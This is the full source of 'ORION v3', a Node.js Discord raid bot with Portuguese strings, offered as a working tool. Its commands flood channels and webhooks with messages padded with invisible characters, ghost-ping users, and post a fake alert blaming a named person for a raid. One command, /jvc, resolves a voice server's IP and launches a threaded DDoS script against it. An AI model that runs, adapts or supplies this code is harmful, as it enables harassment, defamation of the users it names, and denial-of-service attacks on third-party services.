/*
 * ██████  ██████  ██ ██████  ██    ██
 * ██   ██ ██   ██ ██ ██   ██ ██    ██
 * ██████  ██████  ██ ██████  ██    ██
 * ██   ██ ██   ██ ██ ██   ██ ██    ██
 * ██   ██ ██   ██ ██ ██   ██  ██████
 *
 * ORION v3 — Discord Raid Bot (Slash Commands / External Apps)
 * Funciona SEM o bot estar no servidor!
 * Basta usar /raid, /spam etc. como slash command no canal alvo
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, WebhookClient } = require('discord.js');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const axios = require('axios');
const { spawn } = require('child_process');
const dns = require('dns');

// ─── CONFIG ─────────────────────────────────────────────────────────────────
const CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
const TOKEN = CONFIG.token;
const PREFIX = CONFIG.prefix || '/';
const SPAM_FILE = CONFIG.spam_file || path.join(__dirname, 'storage', 'downloads', 'text.txt');

// ─── CLIENT ─────────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

// ─── HELPERS ─────────────────────────────────────────────────────────────────
function log(type, msg) {
  const t = new Date().toLocaleTimeString('pt-BR', { hour12: false });
  const colors = { info: chalk.cyan, ok: chalk.green, warn: chalk.yellow, error: chalk.red, cmd: chalk.magenta, raid: chalk.red.bold };
  const c = colors[type] || chalk.white;
  console.log(c(`[${t}] [${type.toUpperCase()}] ${msg}`));
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function loadSpamLines() {
  try {
    if (!fs.existsSync(SPAM_FILE)) return ['@everyone @here ORION RAID'];
    const data = fs.readFileSync(SPAM_FILE, 'utf8');
    const lines = data.split('\n').filter(l => l.trim().length > 0 && !l.trim().startsWith('-'));
    return lines.length > 0 ? lines : ['@everyone @here ORION RAID'];
  } catch (e) { return ['@everyone @here ORION RAID']; }
}

function generatePollutedMessage(base) {
  const invisibleChars = ['\u200B','\u200C','\u200D','\u200E','\u200F','\uFEFF','\u2060','\u2061','\u2062','\u2063','\u2064'];
  const fillers = [
    'ㅤ'.repeat(Math.floor(Math.random() * 20) + 5),
    '𒐫'.repeat(Math.floor(Math.random() * 30) + 10),
    '࿓'.repeat(Math.floor(Math.random() * 15) + 5),
    'ᅟ'.repeat(Math.floor(Math.random() * 25) + 5)
  ];
  let msg = base + '\n';
  for (let i = 0; i < Math.floor(Math.random() * 4) + 2; i++)
    msg += fillers[Math.floor(Math.random() * fillers.length)] + '\n';
  for (let i = 0; i < Math.floor(Math.random() * 30) + 10; i++)
    msg += invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
  return msg;
}

// ─── SLASH COMMANDS ─────────────────────────────────────────────────────────
const slashCommands = [
  new SlashCommandBuilder()
    .setName('blame')
    .setDescription('Culpa alguem pelo raid')
    .addUserOption(o => o.setName('user').setDescription('Usuario').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Motivo').setRequired(false)),

  new SlashCommandBuilder()
    .setName('raid')
    .setDescription('Envia N mensagens no canal (funciona sem bot no server!)')
    .addIntegerOption(o => o.setName('amount').setDescription('Quantidade (max 50)').setRequired(false).setMinValue(1).setMaxValue(50))
    .addStringOption(o => o.setName('message').setDescription('Mensagem customizada').setRequired(false)),

  new SlashCommandBuilder()
    .setName('gping')
    .setDescription('Ghost ping (pinga e deleta)')
    .addUserOption(o => o.setName('user').setDescription('Alvo').setRequired(true))
    .addIntegerOption(o => o.setName('amount').setDescription('Quantas vezes').setRequired(false).setMinValue(1).setMaxValue(30)),

  new SlashCommandBuilder()
    .setName('spam')
    .setDescription('Spam com texto do arquivo')
    .addIntegerOption(o => o.setName('amount').setDescription('Quantidade (max 100)').setRequired(false).setMinValue(1).setMaxValue(100)),

  new SlashCommandBuilder()
    .setName('invite')
    .setDescription('Mostra o link pra adicionar o Orion'),

  new SlashCommandBuilder()
    .setName('pollute')
    .setDescription('Polui o canal com caracteres especiais')
    .addIntegerOption(o => o.setName('amount').setDescription('Quantidade (max 30)').setRequired(false).setMinValue(1).setMaxValue(30)),

  new SlashCommandBuilder()
    .setName('webhookraid')
    .setDescription('Raid via webhook URL')
    .addStringOption(o => o.setName('url').setDescription('URL do webhook').setRequired(true))
    .addIntegerOption(o => o.setName('amount').setDescription('Quantidade (max 200)').setRequired(false).setMinValue(1).setMaxValue(200))
    .addStringOption(o => o.setName('message').setDescription('Mensagem').setRequired(false)),

  new SlashCommandBuilder()
    .setName('help')
    .setDescription('Mostra todos os comandos'),

  new SlashCommandBuilder()
    .setName('jvc')
    .setDescription('Junta na call e inicia DDoS no IP do voice')
    .addChannelOption(o => o.setName('channel').setDescription('Canal de voz').setRequired(true))
    .addIntegerOption(o => o.setName('threads').setDescription('Threads (padrao 300)').setRequired(false))
    .addIntegerOption(o => o.setName('duration').setDescription('Duracao segundos').setRequired(false)),

  new SlashCommandBuilder()
    .setName('botinfo')
    .setDescription('Info do Orion'),

  new SlashCommandBuilder()
    .setName('ping')
    .setDescription('Pong!'),
];

async function registerCommands() {
  try {
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    log('info', 'Registrando comandos slash globais...');
    await rest.put(Routes.applicationCommands(client.user.id), { body: slashCommands.map(c => c.toJSON()) });
    log('ok', `${slashCommands.length} comandos slash registrados globalmente!`);
  } catch (e) {
    log('error', `Erro registrando comandos: ${e.message}`);
  }
}

// ─── INTERACTION HANDLER ────────────────────────────────────────────────────
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const cmd = interaction.commandName;
  log('cmd', `/${cmd} por ${interaction.user.tag} em #${interaction.channel?.name || 'DM'} [${interaction.guildId || 'DM'}]`);

  try {
    await handleSlashCommand(interaction, cmd);
  } catch (e) {
    log('error', `Erro em /${cmd}: ${e.message}`);
    try { await interaction.reply({ content: `❌ Erro: ${e.message}`, ephemeral: true }); } catch (_) {}
  }
});

async function handleSlashCommand(interaction, cmd) {
  switch (cmd) {
    case 'help': return cmdHelp(interaction);
    case 'blame': return cmdBlame(interaction);
    case 'raid': return cmdRaid(interaction);
    case 'gping': return cmdGping(interaction);
    case 'spam': return cmdSpam(interaction);
    case 'invite': return cmdInvite(interaction);
    case 'pollute': return cmdPollute(interaction);
    case 'webhookraid': return cmdWebhookRaid(interaction);
    case 'jvc': return cmdJvc(interaction);
    case 'botinfo': return cmdBotinfo(interaction);
    case 'ping': return cmdPing(interaction);
    default: return interaction.reply({ content: '❌ Comando desconhecido.', ephemeral: true });
  }
}

// ─── COMMAND: /help ─────────────────────────────────────────────────────────
async function cmdHelp(interaction) {
  const help = [
    '**✦ ORION v3 ✦**',
    '**Total:** 11 comandos slash',
    '**Modo:** External Apps (funciona SEM o bot no servidor!)',
    '',
    '**COMANDOS:**',
    '`/raid [amount] [message]` — Raid no canal atual',
    '`/spam [amount]` — Spam com texto do arquivo',
    '`/gping <user> [amount]` — Ghost ping',
    '`/blame <user> [reason]` — Culpa alguem',
    '`/pollute [amount]` — Polui com chars invisiveis',
    '`/webhookraid <url> [amount] [message]` — Raid via webhook',
    '`/jvc <channel> [threads] [duration]` — DDoS em call',
    '`/invite` — Link do bot',
    '`/botinfo` — Info',
    '`/ping` — Pong!',
    '',
    '🔥 **Orion na area!**'
  ].join('\n');
  await interaction.reply({ content: help });
}

// ─── COMMAND: /blame ────────────────────────────────────────────────────────
async function cmdBlame(interaction) {
  const target = interaction.options.getUser('user');
  const reason = interaction.options.getString('reason') || 'raidar o servidor';

  const msg = [
    `🚨 **ALERTA DE RAID!** 🚨`,
    ``,
    `O ${target} foi responsavel pelo raid no servidor!`,
    `**Motivo:** ${reason}`,
    ``,
    `🔹 Nao confie no ${target}`,
    `🔹 Reportem ele para a administracao`,
    `🔹 Ele esta usando bots para derrubar o server`,
    ``,
    `**Assinado:** Orion v3`,
    `<@${target.id}> @everyone @here`
  ].join('\n');

  await interaction.reply({ content: msg });
}

// ─── COMMAND: /raid ─────────────────────────────────────────────────────────
async function cmdRaid(interaction) {
  let amount = interaction.options.getInteger('amount') || 20;
  const customMsg = interaction.options.getString('message') || null;
  if (amount > 50) amount = 50;

  await interaction.reply({ content: `🔥 **Raid iniciado!** ${amount} mensagens neste canal.` });

  const spamLines = loadSpamLines();
  let sent = 0;

  // Use interaction webhook to send messages (works even if bot not in server!)
  for (let i = 0; i < amount; i++) {
    try {
      const text = customMsg || spamLines[Math.floor(Math.random() * spamLines.length)];
      const polluted = generatePollutedMessage(text);
      await interaction.followUp({ content: polluted });
      sent++;
      await sleep(Math.floor(Math.random() * 300) + 200);
    } catch (e) {
      log('error', `Raid followUp erro: ${e.message}`);
      if (e.message.includes('rate')) await sleep(3000);
    }
  }

  try {
    await interaction.followUp({ content: `✅ **Raid concluido!** ${sent}/${amount} mensagens.` });
  } catch (_) {}
  log('raid', `/raid -> ${sent} msgs em #${interaction.channel?.name || '?'}`);
}

// ─── COMMAND: /gping ────────────────────────────────────────────────────────
async function cmdGping(interaction) {
  const target = interaction.options.getUser('user');
  let amount = interaction.options.getInteger('amount') || 5;
  if (amount > 30) amount = 30;

  await interaction.reply({ content: `👻 **Ghost Ping** em ${target} ${amount}x` });

  let sent = 0;
  for (let i = 0; i < amount; i++) {
    try {
      const pingMsg = await interaction.channel.send(`<@${target.id}>`);
      await pingMsg.delete();
      sent++;
      await sleep(Math.floor(Math.random() * 200) + 100);
    } catch (e) {
      log('error', `GPing erro: ${e.message}`);
    }
  }

  try { await interaction.followUp({ content: `✅ Ghost ping: ${sent}x em ${target.tag}` }); } catch (_) {}
}

// ─── COMMAND: /spam ─────────────────────────────────────────────────────────
async function cmdSpam(interaction) {
  let amount = interaction.options.getInteger('amount') || 30;
  if (amount > 100) amount = 100;

  await interaction.reply({ content: `💬 **Spam iniciado!** ${amount} mensagens do arquivo.` });

  const spamLines = loadSpamLines();
  let sent = 0;
  let lineIdx = 0;

  for (let i = 0; i < amount; i++) {
    try {
      const text = spamLines[lineIdx % spamLines.length];
      const polluted = generatePollutedMessage(text);
      await interaction.followUp({ content: polluted });
      sent++;
      lineIdx++;
      await sleep(Math.floor(Math.random() * 200) + 100);
    } catch (e) {
      if (e.message.includes('rate')) await sleep(3000);
    }
  }

  try { await interaction.followUp({ content: `✅ Spam: ${sent}/${amount}` }); } catch (_) {}
}

// ─── COMMAND: /invite ───────────────────────────────────────────────────────
async function cmdInvite(interaction) {
  const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;
  await interaction.reply({ content: `🔗 **Link do Orion:**\n${oauthUrl}\n\n🤖 Adicione a servidores com este link.` });
}

// ─── COMMAND: /pollute ──────────────────────────────────────────────────────
async function cmdPollute(interaction) {
  let amount = interaction.options.getInteger('amount') || 10;
  if (amount > 30) amount = 30;

  await interaction.reply({ content: `☣️ **Poluindo canal...** ${amount} mensagens` });

  const pollutants = [
    'ㅤ'.repeat(200) + '@everyone @here',
    '𒐫'.repeat(100) + ' ' + '᠎'.repeat(100),
    '࿓'.repeat(80) + '\n' + 'ᅟ'.repeat(80),
    '\u200B'.repeat(500) + '@everyone',
    '᠎᠎᠎᠎᠎᠎᠎᠎'.repeat(50) + ' ORION ' + '᠎᠎᠎᠎᠎᠎᠎᠎'.repeat(50)
  ];

  for (let i = 0; i < amount; i++) {
    try {
      await interaction.followUp({ content: pollutants[Math.floor(Math.random() * pollutants.length)] });
      await sleep(Math.floor(Math.random() * 200) + 100);
    } catch (e) {}
  }

  try { await interaction.followUp({ content: `✅ Poluicao: ${amount} msgs` }); } catch (_) {}
}

// ─── COMMAND: /webhookraid ─────────────────────────────────────────────────
async function cmdWebhookRaid(interaction) {
  const url = interaction.options.getString('url');
  let amount = interaction.options.getInteger('amount') || 20;
  const customMsg = interaction.options.getString('message') || '@everyone @here **ORION WEBHOOK RAID!**';
  if (amount > 200) amount = 200;

  await interaction.reply({ content: `🔥 **Webhook Raid!** ${amount} msgs` });

  let sent = 0;
  const spamLines = loadSpamLines();

  for (let i = 0; i < amount; i++) {
    try {
      const text = customMsg || spamLines[Math.floor(Math.random() * spamLines.length)];
      const content = generatePollutedMessage(text);
      await axios.post(url, {
        content,
        username: 'Orion Raid',
        avatar_url: null
      }, { headers: { 'Content-Type': 'application/json' } });
      sent++;
      await sleep(Math.floor(Math.random() * 100) + 50);
    } catch (e) {
      if (e.response?.status === 429) {
        const wait = e.response?.data?.retry_after || 5;
        await sleep(wait * 1000 + 500);
      }
    }
  }

  try { await interaction.followUp({ content: `✅ Webhook Raid: ${sent}/${amount}` }); } catch (_) {}
}

// ─── COMMAND: /jvc ──────────────────────────────────────────────────────────
let activeAttacks = new Map();

async function cmdJvc(interaction) {
  const channel = interaction.options.getChannel('channel');
  let threads = interaction.options.getInteger('threads') || 300;
  let duration = interaction.options.getInteger('duration') || 120;

  if (!channel || (channel.type !== 2 && channel.type !== 13)) {
    return interaction.reply({ content: '❌ Isso nao e um canal de voz.', ephemeral: true });
  }

  const guild = interaction.guild;
  if (!guild) return interaction.reply({ content: '❌ So funciona em servidores.', ephemeral: true });

  // Check if already attacking
  if (activeAttacks.has(guild.id)) {
    return interaction.reply({ content: `⚠️ Ja existe ataque neste server! Use /help.`, ephemeral: true });
  }

  await interaction.reply({ content: `🔊 Conectando a **${channel.name}**...` });

  try {
    const connection = await channel.join();
    let voiceIp = null;
    let voicePort = 443;

    // Get endpoint
    let endpoint = connection.endpoint || null;

    // Try to get from voice state
    if (!endpoint) {
      try {
        const states = guild.voiceStates.cache;
        const myState = states.get(client.user.id);
        if (myState && myState.channelId === channel.id) {
          const server = myState.voice?.server || myState._voice?.server;
          if (server?.endpoint) endpoint = server.endpoint;
        }
      } catch (e) {}
    }

    // Resolve DNS
    if (endpoint) {
      const hostname = endpoint.replace(/:\d+$/, '').split(':')[0];
      try {
        const addrs = await dns.promises.resolve4(hostname);
        voiceIp = addrs[0];
      } catch (e) {
        return interaction.editReply({ content: `❌ Nao foi possivel resolver IP do servidor de voz.\nEndpoint: ${endpoint}` });
      }
      if (endpoint.includes(':')) voicePort = parseInt(endpoint.split(':')[1]) || 443;
    }

    if (!voiceIp) {
      return interaction.editReply({ content: '❌ Nao foi possivel obter IP da call.' });
    }

    await interaction.editReply({
      content: [
        `🎯 **ALVO CAPTURADO!**`,
        `**IP:** ${voiceIp}:${voicePort}`,
        `**Threads:** ${threads} | **Duracao:** ${duration}s`,
        `🔥 Iniciando DDoS...`
      ].join('\n')
    });

    // Start DDoS
    const ddosScript = path.join(__dirname, 'ddos_engine.py');
    const proc = spawn('python3', [ddosScript, voiceIp, String(voicePort), String(threads), String(duration), 'mixed'], { cwd: __dirname });

    activeAttacks.set(guild.id, { process: proc, ip: voiceIp, port: voicePort, start: Date.now() });

    proc.on('close', (code) => {
      activeAttacks.delete(guild.id);
      log('ok', `DDoS finalizado (${code}) para ${voiceIp}`);
      try {
        interaction.followUp({ content: `✅ **DDoS finalizado!** ${voiceIp}:${voicePort} (${code})` });
      } catch (_) {}
    });

    proc.on('error', (err) => {
      activeAttacks.delete(guild.id);
      log('error', `DDoS erro: ${err.message}`);
    });

    log('cmd', `/jvc -> ${voiceIp}:${voicePort} em ${guild.name}`);
  } catch (e) {
    await interaction.editReply({ content: `❌ Erro: ${e.message}` });
  }
}

// ─── COMMAND: /botinfo ──────────────────────────────────────────────────────
async function cmdBotinfo(interaction) {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  const info = [
    `**✦ ORION v3 ✦**`,
    ``,
    `**Developer:** Setsociety`,
    `**Uptime:** ${h}h ${m}m ${s}s`,
    `**Ping:** ${client.ws.ping}ms`,
    `**Node:** ${process.version}`,
    `**Modo:** External Apps (funciona sem estar no server!)`,
    ``,
    `🔥 **Orion na area!**`
  ].join('\n');

  await interaction.reply({ content: info });
}

// ─── COMMAND: /ping ─────────────────────────────────────────────────────────
async function cmdPing(interaction) {
  await interaction.reply({ content: `🏓 **Pong!** ${client.ws.ping}ms` });
}

// ─── MESSAGE COMMANDS (DM only) ─────────────────────────────────────────────
const msgCommands = new Map();

function registerMsg(name, fn, opts = {}) {
  msgCommands.set(name, { fn, ...opts });
}

registerMsg('help', async (msg, args) => {
  const help = [
    '**✦ ORION v3 ✦**',
    '**Comandos (DM):**',
    '`/help` — Ajuda',
    '`/invite` — Link do bot',
    '`/botinfo` — Info',
    '`/eval <code>` — Executa JS (dono)',
    '`/restart` — Reinicia',
    '`/shutdown` — Desliga',
    '',
    '**Use comandos SLASH em servidores!**',
    'Eles funcionam mesmo sem o bot estar no server 😎'
  ].join('\n');
  await msg.reply(help);
});

registerMsg('invite', async (msg, args) => {
  const url = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;
  await msg.reply(`🔗 ${url}`);
});

registerMsg('botinfo', async (msg, args) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  await msg.reply(`🦅 **Orion v3** | Uptime: ${h}h ${m}m | Ping: ${client.ws.ping}ms`);
});

registerMsg('eval', async (msg, args) => {
  if (msg.author.id !== client.user.id) return msg.reply('❌ So o dono.');
  const code = args.join(' ');
  if (!code) return msg.reply('❌ Digite codigo.');
  try {
    let r = eval(code);
    if (typeof r !== 'string') r = JSON.stringify(r, null, 2);
    if (r.length > 1900) r = r.substring(0, 1900) + '...';
    await msg.reply(`\`\`\`js\n${r}\n\`\`\``);
  } catch (e) {
    await msg.reply(`\`\`\`js\nError: ${e.message}\n\`\`\``);
  }
});

registerMsg('restart', async (msg, args) => {
  if (msg.author.id !== client.user.id) return;
  await msg.reply('🔄 Reiniciando...');
  process.exit(0);
});

registerMsg('shutdown', async (msg, args) => {
  if (msg.author.id !== client.user.id) return;
  await msg.reply('👋 Desligando...');
  setTimeout(() => { client.destroy(); process.exit(0); }, 1000);
});

// ─── MESSAGE HANDLER (DMs only) ────────────────────────────────────────────
client.on('messageCreate', async (msg) => {
  if (msg.author.bot) return;
  if (msg.author.id !== client.user.id) return;
  if (msg.guildId) return; // Only respond in DMs for prefix commands

  if (!msg.content.startsWith(PREFIX)) return;

  const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
  const cmdName = args.shift().toLowerCase();

  const cmd = msgCommands.get(cmdName);
  if (!cmd) return;

  log('cmd', `DM: ${PREFIX}${cmdName}`);
  try {
    await cmd.fn(msg, args);
  } catch (e) {
    log('error', `DM cmd erro: ${e.message}`);
    msg.reply(`❌ Erro: ${e.message}`);
  }
});

// ─── READY ──────────────────────────────────────────────────────────────────
client.on('ready', async () => {
  console.clear();
  const user = client.user;
  console.log(chalk.red.bold(`
██████  ██████  ██ ██████  ██    ██
██   ██ ██   ██ ██ ██   ██ ██    ██
██████  ██████  ██ ██████  ██    ██
██   ██ ██   ██ ██ ██   ██ ██    ██
██   ██ ██   ██ ██ ██   ██  ██████ v3
  `));
  console.log(chalk.cyan('✦═══════════════════════════════════════✧'));
  console.log(chalk.white('  Orion v3 - Discord Raid Bot'));
  console.log(chalk.white('  Logado: ' + chalk.green.bold(user.tag)));
  console.log(chalk.white('  Modo: ' + chalk.yellow('External Apps (slash commands)')));
  console.log(chalk.white('  Slash: ' + chalk.cyan(slashCommands.length + ' comandos')));
  console.log(chalk.cyan('✦═══════════════════════════════════════✧'));
  console.log(chalk.green('\n  ' + chalk.bold('Orion pronto!') + ' Use comandos / em QUALQUER servidor!'));
  console.log(chalk.gray('  Sem precisar estar no server!\n'));

  await registerCommands();
  log('ok', 'Orion v3 pronto!');
});

// ─── ERROR HANDLING ─────────────────────────────────────────────────────────
client.on('error', (e) => log('error', `Client: ${e.message}`));
process.on('unhandledRejection', (e) => {
  if (e.message?.includes('rate')) return;
  log('error', `Unhandled: ${e.message}`);
});

// ─── START ──────────────────────────────────────────────────────────────────
if (!TOKEN || TOKEN === '') {
  console.log(chalk.red('\n❌ Configure o token em config.json!\n'));
  process.exit(1);
}

log('info', 'Iniciando Orion v3...');
client.login(TOKEN).catch(e => {
  console.log(chalk.red(`\n❌ ${e.message}\n`));
  process.exit(1);
});
